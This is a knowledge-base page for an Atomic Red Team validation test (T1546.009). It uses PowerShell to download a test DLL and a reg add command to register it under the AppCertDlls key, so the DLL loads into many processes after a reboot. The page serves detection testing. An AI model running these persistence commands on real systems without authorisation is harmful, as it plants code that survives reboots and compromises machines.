---
atomic_guid: "a5ad6104-5bab-4c43-b295-b4c44c7c6b05"
title: "Create registry persistence via AppCert DLL"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.009"
attack_technique_name: "Event Triggered Execution: AppCert DLLs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.009/T1546.009.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "a5ad6104-5bab-4c43-b295-b4c44c7c6b05"
  - "Create registry persistence via AppCert DLL"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Create registry persistence via AppCert DLL

Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. 
Once the computer restarted, the DLL will be loaded in multiple processes and write an 
'AtomicTest.txt' file in C:\Users\Public\ to validate that the DLL executed succesfully.

Reference: https://skanthak.homepage.t-online.de/appcert.html

## Metadata

- Atomic GUID: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
- Technique: T1546.009: Event Triggered Execution: AppCert DLLs
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1546.009/T1546.009.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.009]]

## Input Arguments

### dll_path

- description: path of dll to use
- type: path
- default: PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll

### reboot

- description: Set value to $true if you want to automatically reboot the machine
- type: string
- default: $false

## Dependencies

File to copy must exist on disk at specified location (#{dll_path})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll" -OutFile "#{dll_path}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Copy-Item "#{dll_path}" C:\Users\Public\AtomicTest.dll -Force
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f
if(#{reboot}){Restart-Computer}
```

### Cleanup

```powershell
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f
Remove-Item C:\Users\Public\AtomicTest.dll -Force
Remove-Item C:\Users\Public\AtomicTest.txt -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.009/T1546.009.yaml)
